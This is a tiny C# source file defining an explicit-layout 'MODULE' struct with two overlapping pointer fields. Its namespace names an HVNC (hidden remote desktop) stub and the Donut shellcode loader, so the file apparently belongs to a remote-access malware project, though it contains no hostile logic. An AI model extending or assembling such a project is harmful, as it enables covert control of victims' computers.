using System;
using System.Runtime.InteropServices;

namespace ShitarusPrivate.HVNC.StubUtils.Donut.Structs
{
    [StructLayout(LayoutKind.Explicit)]
    public struct MODULE
    {
        [FieldOffset(0)]
        public IntPtr x;

        [FieldOffset(0)]
        public IntPtr p;
    }
}
